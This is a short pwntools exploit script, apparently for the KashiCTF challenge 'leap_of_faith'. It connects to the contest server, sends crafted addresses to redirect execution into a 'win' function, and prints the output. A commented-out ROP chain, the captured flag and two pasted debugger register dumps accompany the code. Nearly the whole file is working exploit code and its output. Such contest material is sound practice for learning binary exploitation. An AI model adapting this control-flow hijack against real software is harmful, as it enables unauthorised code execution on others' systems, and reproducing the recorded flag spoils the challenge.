from pwn import *
elf = context.binary = ELF("./chall")
# p = process()
p = remote("kashictf.iitbhucybersec.in", 27952)
for i in range(100):
    p.sendline("0x000000000040125e")
# rop = ROP(context.binary)
# win = 0x0000000000401182
# rop.rdi = 0xdf
# rop.rsi = 0xaf
# rop.rdx = 0xc0df
# rop.raw(win)

# write("payload",rop.chain())
p.sendline("0x00000000004011ba")
print(p.recvall().strip().decode())

# KashiCTF{m4r10_15_fun_w17H_C_eKa3zEWA}

# No main
#  RAX  0x4011ba (win+56) ◂— lea rsi, [rip + 0xe47]
#  RBX  0x7fffffffdf58 —▸ 0x7fffffffe1ef ◂— '/home/dadan/pwn/ctftime/kashictf/leap_of_faith/chall'
#  RCX  0
#  RDX  0
#  RDI  0x7fffffffd8f0 ◂— '000000000004011ba'
#  RSI  0x4011ba (win+56) ◂— lea rsi, [rip + 0xe47]
#  R8   0xfffffffffffffff
#  R9   0x7ffff7f9da80 (_IO_2_1_stdin_) ◂— 0xfbad2288
#  R10  0x7ffff7f47ac0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000
#  R11  0
#  R12  0
#  R13  0x7fffffffdf68 —▸ 0x7fffffffe224 ◂— 'SHELL=/usr/bin/zsh'
#  R14  0
#  R15  0x7ffff7ffd020 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
#  RBP  0x7fffffffde40 ◂— 1
#  RSP  0x7fffffffde20 ◂— 5
# *RIP  0x4011ba (win+56) ◂— lea rsi, [rip + 0xe47]

# with main

#  RAX  0x4011ba (win+56) ◂— lea rsi, [rip + 0xe47]
#  RBX  0x7fffffffdf58 —▸ 0x7fffffffe1ef ◂— '/home/dadan/pwn/ctftime/kashictf/leap_of_faith/chall'
#  RCX  0
#  RDX  0
#  RDI  0x7fffffffd3f0 ◂— '000000000004011ba'
#  RSI  0x4011ba (win+56) ◂— lea rsi, [rip + 0xe47]
#  R8   0xfffffffffffffff
#  R9   0x7ffff7f9da80 (_IO_2_1_stdin_) ◂— 0xfbad2288
#  R10  0x7ffff7f47ac0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000
#  R11  0
#  R12  0
#  R13  0x7fffffffdf68 —▸ 0x7fffffffe224 ◂— 'SHELL=/usr/bin/zsh'
#  R14  0
#  R15  0x7ffff7ffd020 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
#  RBP  0x7fffffffde40 ◂— 1
#  RSP  0x7fffffffd920 ◂— 0
# *RIP  0x4011ba (win+56) ◂— lea rsi, [rip + 0xe47]